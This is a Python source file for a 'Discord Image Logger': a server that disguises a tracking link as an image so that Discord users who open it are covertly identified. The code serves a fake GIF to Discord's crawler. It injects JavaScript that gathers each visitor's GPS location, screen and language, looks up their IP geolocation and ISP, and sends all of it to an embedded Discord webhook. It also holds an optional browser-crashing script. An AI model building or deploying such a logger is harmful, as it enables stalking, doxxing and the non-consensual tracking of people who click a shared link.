from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, socket
from datetime import datetime, timezone

__app__         = "Discord Image Logger"
__description__ = "Advanced IP logger — abuses Discord's Open Original feature"
__version__     = "v3.0"
__author__      = "C00lB0i"

config = {
    # ── BASE CONFIG ──────────────────────────────────────────────────────────
    "webhook": "https://discordapp.com/api/webhooks/1473590436055482430/9n7NGn-u_xqmSa9ofFsKc2KW_yXxkRNHSk21c5A94bDnHaEMuSePrSK2WEeNKqpKVhWU",
    "image":   "https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExbDVtZWtpb3JpNXpqOXdtMTBkNGF4dHZnc21vMGN6YXprNTM0cmxwMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/ZuzxVIWWHUQDkhrtu6/giphy.gif",
    "imageArgument": True,   # Allow ?url= or ?id= param to override the image

    # ── CUSTOMIZATION ────────────────────────────────────────────────────────
    "username": "Image Logger",
    "color":    0x00FFFF,    # Cyan embed border

    # ── OPTIONS ──────────────────────────────────────────────────────────────
    "crashBrowser":    False,
    "accurateLocation": True,  # Collect GPS coords via browser JS (asks user)

    "message": {
        "doMessage":   False,
        "message":     "This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC",
        "richMessage": True,
    },

    "vpnCheck": 1,   # 0=off | 1=no ping for VPN | 2=skip alert for VPN
    "linkAlerts": True,
    "buggedImage": True,

    "antiBot": 1,    # 0=off | 1=no ping hosting | 2=no ping 100% bot
                     # 3=skip alert hosting | 4=skip alert 100% bot

    # ── REDIRECTION ──────────────────────────────────────────────────────────
    "redirect": {
        "redirect": False,
        "page":     "https://your-link.here",
    },
}

# IPs / prefixes to silently ignore (Discord crawlers, known bots, etc.)
blacklistedIPs = ("27", "104", "143", "164")

# In-memory visit counter  {endpoint: count}
_visit_counts: dict = {}


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

def _flag(country_code: str) -> str:
    """Convert a 2-letter ISO country code to a flag emoji."""
    if not country_code or len(country_code) != 2:
        return ""
    return "".join(chr(0x1F1E6 + ord(c) - ord("A")) for c in country_code.upper())


def _rdns(ip: str) -> str:
    """Reverse-DNS lookup. Returns hostname or 'N/A'."""
    try:
        return socket.gethostbyaddr(ip)[0]
    except Exception:
        return "N/A"


def _get_ip(headers) -> str:
    """
    Safely extract the real visitor IP from request headers.
    Tries x-forwarded-for first, then x-real-ip, then falls back to ''.
    """
    forwarded = headers.get("x-forwarded-for") or ""
    if forwarded:
        # x-forwarded-for may be a comma-separated list; first entry = client
        return forwarded.split(",")[0].strip()
    return (headers.get("x-real-ip") or "").strip()


def botCheck(ip: str, useragent: str) -> str | bool:
    if ip.startswith(("34", "35")):
        return "Discord"
    if (useragent or "").startswith("TelegramBot"):
        return "Telegram"
    return False


def reportError(error: str):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content":  "@everyone",
        "embeds": [{
            "title":       "Image Logger — Error",
            "color":       config["color"],
            "description": f"An error occurred while logging an IP!\n\n**Error:**\n```\n{error}\n```",
        }],
    })


def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False,
               screen=None, lang=None):
    """
    Build and POST a rich Discord embed for a real visitor.

    Parameters
    ----------
    ip        : visitor IP address
    useragent : raw User-Agent string
    coords    : "lat,lon" string from GPS (accurate) or None (use ip-api)
    endpoint  : URL path that was hit
    url       : bait image URL (used as embed thumbnail)
    screen    : "WxH" screen resolution string from JS
    lang      : browser language from JS
    """
    if not ip or ip.startswith(blacklistedIPs):
        return

    bot = botCheck(ip, useragent or "")

    # ── Bot / link-alert path ─────────────────────────────────────────────
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "content":  "",
                "embeds": [{
                    "title": "Image Logger — Link Sent",
                    "color": config["color"],
                    "description": (
                        f"An **Image Logging** link was sent in a chat!\n"
                        f"You may receive an IP soon.\n\n"
                        f"**Endpoint:** `{endpoint}`\n"
                        f"**IP:** `{ip}`\n"
                        f"**Platform:** `{bot}`"
                    ),
                }],
            })
        return

    # ── Geolocation via ip-api.com ────────────────────────────────────────
    ping = "@everyone"
    try:
        info = requests.get(
            f"http://ip-api.com/json/{ip}?fields=16976857",
            timeout=5
        ).json()
    except Exception:
        info = {}

    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""

    if info.get("hosting"):
        if config["antiBot"] == 4 and not info.get("proxy"):
            return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2 and not info.get("proxy"):
            ping = ""
        if config["antiBot"] == 1:
            ping = ""

    # ── OS / Browser ──────────────────────────────────────────────────────
    os_name, browser_name = httpagentparser.simple_detect(useragent or "")

    # ── Coordinates & Google Maps link ───────────────────────────────────
    lat  = info.get("lat", "")
    lon  = info.get("lon", "")

    if coords:
        # Accurate GPS coords from browser JS
        parts = coords.replace(",", " ").split()
        if len(parts) == 2:
            lat, lon = parts[0], parts[1]
        coord_label  = "📍 Precise (GPS)"
        coord_source = "GPS"
    else:
        coord_label  = "📍 Approximate (IP)"
        coord_source = "IP-based"

    if lat and lon:
        maps_url   = f"https://www.google.com/maps?q={lat},{lon}"
        coord_text = f"`{lat}, {lon}` — [Open in Google Maps]({maps_url})"
    else:
        coord_text = "`Unknown`"

    # ── Country flag ─────────────────────────────────────────────────────
    country_code = info.get("countryCode", "")
    flag         = _flag(country_code)

    # ── Reverse DNS ───────────────────────────────────────────────────────
    hostname = _rdns(ip)

    # ── Timezone ──────────────────────────────────────────────────────────
    tz_raw = info.get("timezone", "/")
    tz_parts = tz_raw.split("/")
    tz_display = (
        f"{tz_parts[1].replace('_', ' ')} ({tz_parts[0]})"
        if len(tz_parts) == 2 else tz_raw
    )

    # ── Visit counter ─────────────────────────────────────────────────────
    _visit_counts[endpoint] = _visit_counts.get(endpoint, 0) + 1
    visit_no = _visit_counts[endpoint]

    # ── Timestamp ─────────────────────────────────────────────────────────
    now_utc = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")

    # ── Build embed description ───────────────────────────────────────────
    description = f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`   •   **Visit #:** `{visit_no}`

**🌐 IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Hostname (rDNS):** `{hostname}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Org:** `{info.get('org', 'Unknown')}`

**{flag} Location:**
> **Country:** `{info.get('country', 'Unknown')}` {flag}
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **ZIP:** `{info.get('zip', 'Unknown')}`
> **Coords ({coord_source}):** {coord_text}
> **Timezone:** `{tz_display}`

**🔒 Threat Info:**
> **Mobile:** `{info.get('mobile', 'Unknown')}`
> **VPN/Proxy:** `{info.get('proxy', 'Unknown')}`
> **Hosting/Bot:** `{info.get('hosting', False) if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`

**💻 Device Info:**
> **OS:** `{os_name}`
> **Browser:** `{browser_name}`
> **Screen:** `{screen if screen else 'Unknown'}`
> **Language:** `{lang if lang else 'Unknown'}`

**User Agent:**
```
{useragent}
```"""

    embed = {
        "username": config["username"],
        "content":  ping,
        "embeds": [{
            "title":       "Image Logger — IP Logged",
            "color":       config["color"],
            "description": description,
            "footer":      {"text": f"🕐 {now_utc}"},
        }],
    }

    if url:
        embed["embeds"][0]["thumbnail"] = {"url": url}

    requests.post(config["webhook"], json=embed)
    return info


# ─────────────────────────────────────────────────────────────────────────────
# Fake "loading" GIF served to Discord crawlers
# ─────────────────────────────────────────────────────────────────────────────
binaries = {
    "loading": base64.b85decode(
        b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000'
    )
}


# ─────────────────────────────────────────────────────────────────────────────
# JS injected into the page to collect device info + GPS + redirect to image
# ─────────────────────────────────────────────────────────────────────────────
_COLLECTOR_JS = """
<script>
(function() {
    var base = window.location.href.split('?')[0];
    var params = new URLSearchParams(window.location.search);

    // Screen resolution & language
    params.set('sr', screen.width + 'x' + screen.height);
    params.set('lang', navigator.language || navigator.userLanguage || '');

    function redirect(p) {
        window.location.replace(base + '?' + p.toString());
    }

    // GPS (only ask once — if 'g' param not already set)
    if (!params.has('g') && navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            function(pos) {
                var coords = pos.coords.latitude + ',' + pos.coords.longitude;
                params.set('g', btoa(coords));
                redirect(params);
            },
            function() {
                // User denied or error — still send screen/lang
                if (!params.has('sr_sent')) {
                    params.set('sr_sent', '1');
                    redirect(params);
                }
            },
            { timeout: 8000 }
        );
    } else if (!params.has('sr_sent')) {
        params.set('sr_sent', '1');
        redirect(params);
    }
})();
</script>
"""


# ─────────────────────────────────────────────────────────────────────────────
# Request handler
# ─────────────────────────────────────────────────────────────────────────────
class ImageLoggerAPI(BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        """Suppress default access-log output."""
        pass

    def handleRequest(self):
        try:
            s   = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

            # ── Resolve image URL ─────────────────────────────────────────
            if config["imageArgument"] and (dic.get("url") or dic.get("id")):
                raw = dic.get("url") or dic.get("id")
                try:
                    url = base64.b64decode(raw.encode()).decode()
                except Exception:
                    url = config["image"]
            else:
                url = config["image"]

            # ── Safely get visitor IP ─────────────────────────────────────
            ip = _get_ip(self.headers)
            ua = self.headers.get("user-agent") or ""

            # ── Blacklist check ───────────────────────────────────────────
            if ip and ip.startswith(blacklistedIPs):
                self._send_redirect(url)
                return

            # ── Discord / bot crawler path ────────────────────────────────
            if botCheck(ip, ua):
                if config["buggedImage"]:
                    self.send_response(200)
                    self.send_header("Content-type", "image/gif")
                    self.end_headers()
                    self.wfile.write(binaries["loading"])
                else:
                    self._send_redirect(url)

                makeReport(ip, endpoint=s.split("?")[0], url=url)
                return

            # ── Real visitor path ─────────────────────────────────────────
            endpoint = s.split("?")[0]

            # Collect optional JS-supplied params
            coords = None
            if dic.get("g") and config["accurateLocation"]:
                try:
                    coords = base64.b64decode(dic["g"].encode()).decode()
                except Exception:
                    coords = None

            screen = dic.get("sr") or None
            lang   = dic.get("lang") or None

            # Only log on the "final" request (when sr_sent is set, or no GPS)
            # This avoids duplicate webhook pings from the JS redirect chain.
            should_log = dic.get("sr_sent") or not config["accurateLocation"]

            if should_log:
                makeReport(ip, ua, coords, endpoint, url=url,
                           screen=screen, lang=lang)

            # ── Decide what to serve ──────────────────────────────────────
            if config["redirect"]["redirect"]:
                self._send_redirect(config["redirect"]["page"])
                return

            # Build response page: inject JS collector then redirect to image
            if config["message"]["doMessage"]:
                body = config["message"]["message"].encode()
                ctype = "text/html"
            elif config["crashBrowser"]:
                body  = b'<script>setTimeout(function(){for(var i=69420;i==i;i*=i){console.log(i)}},100)</script>'
                ctype = "text/html"
            else:
                # Serve a transparent page that runs the JS collector,
                # then (after collection) does a final redirect to the image.
                # On the final hop (sr_sent=1) we redirect straight to the image.
                if dic.get("sr_sent"):
                    self._send_redirect(url)
                    return
                else:
                    page = (
                        "<!DOCTYPE html><html><head>"
                        "<meta name='viewport' content='width=device-width'>"
                        "<style>body{margin:0;background:#000}</style>"
                        "</head><body>"
                        + _COLLECTOR_JS +
                        "</body></html>"
                    )
                    body  = page.encode()
                    ctype = "text/html"

            self.send_response(200)
            self.send_header("Content-type", ctype)
            self.end_headers()
            self.wfile.write(body)

        except Exception:
            try:
                self.send_response(500)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(
                    b"500 - Internal Server Error<br>"
                    b"Check your Discord webhook for the traceback."
                )
                reportError(traceback.format_exc())
            except Exception:
                pass

    def _send_redirect(self, location: str):
        self.send_response(302)
        self.send_header("Location", location)
        self.end_headers()

    do_GET  = handleRequest
    do_POST = handleRequest


handler = app = ImageLoggerAPI
